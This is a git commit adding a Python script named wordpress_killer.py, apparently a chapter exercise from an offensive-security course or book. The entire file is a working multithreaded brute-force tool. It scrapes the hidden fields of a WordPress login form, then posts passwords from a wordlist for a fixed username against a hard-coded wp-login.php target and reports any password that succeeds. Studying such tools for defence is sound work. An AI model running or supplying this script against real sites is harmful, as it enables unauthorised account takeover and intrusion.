29bd65638d615f4f3baa655163ba6ebe01799834
Carlo Occhiena <57464184+carloocchiena@users.noreply.github.com>
2021-11-12 19:24:29 +0100

    Create wordpress_killer.py

---
+++ Chapter 5/wordpress_killer.py
@@ -0,0 +1,73 @@
+from io import BytesIO
+from lxml import etree
+from queue import Queue
+
+import requests
+import sys
+import threading
+import time
+
+SUCCESS = 'Welcome to WordPress!'
+TARGET = "http://boodelyboo.com/wordpress/wp-login.php"
+WORDLIST = 'cain.txt'
+
+
+def get_words():
+    with open(WORDLIST) as f:
+        raw_words = f.read()
+
+    words = Queue()
+    for word in raw_words.split():
+        words.put(word)
+    return words
+
+
+def get_params(content):
+    params = dict()
+    parser = etree.HTMLParser()
+    tree = etree.parse(BytesIO(content), parser=parser)
+    for elem in tree.findall('//input'):
+        name = elem.get('name')
+        if name is not None:
+            params[name] = elem.get('value', None)
+    return params
+
+
+class Bruter:
+    def __init__(self, username, url):
+        self.username = username
+        self.url = url
+        self.found = False
+        print(f'\nBrute Force Attack beginning on {url}.\n')
+        print("Finished the setup where username = %s\n" % username)
+
+    def run_bruteforce(self, passwords):
+        for _ in range(10):
+            t = threading.Thread(target=self.web_bruter, args=(passwords,))
+            t.start()
+
+    def web_bruter(self, passwords):
+        session = requests.Session()
+        resp0 = session.get(self.url)
+        params = get_params(resp0.content)
+        params['log'] = self.username
+
+        while not passwords.empty() and not self.found:
+            time.sleep(5)
+            passwd = passwords.get()
+            print(f'Trying username/password {self.username}/{passwd:<10}')
+            params['pwd'] = passwd
+            resp1 = session.post(self.url, data=params)
+            
+            if SUCCESS in resp1.content.decode():
+                self.found = True
+                print(f"\nBruteforcing successful.")
+                print("Username is %s" % self.username)
+                print("Password is %s\n" % passwd)
+                self.found = True
+
+
+if __name__ == '__main__':
+    b = Bruter('tim', TARGET)
+    words = get_words()
+    b.run_bruteforce(words)
